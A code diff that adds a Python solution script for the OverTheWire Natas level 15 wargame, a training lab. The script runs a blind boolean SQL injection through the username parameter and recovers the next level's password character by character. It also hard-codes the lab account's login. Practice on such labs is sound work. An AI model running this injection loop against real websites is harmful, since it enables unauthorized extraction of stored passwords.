@@ -1,0 +1,19 @@
+import requests, string
+
+url = "http://natas15.natas.labs.overthewire.org/"
+auth_username = "natas15"
+auth_password = "SdqIqBsFcz3yotlNYErZSZwblkm0lrvx" 
+char = string.ascii_letters + string.digits
+exists_string = "This user exists"
+password_dictionary = []
+
+print('Start brute force on', url)
+for i in range(32):
+    for c in char:
+        query = '?username=natas16" and password like binary "' + ''.join(password_dictionary) + c + '%" -- '
+        uri = url + query
+        r = requests.get(uri, auth=(auth_username, auth_password))
+        if exists_string in r.text:
+            password_dictionary.append(c)
+            print("Password: {0}".format(''.join(password_dictionary)))
+            break
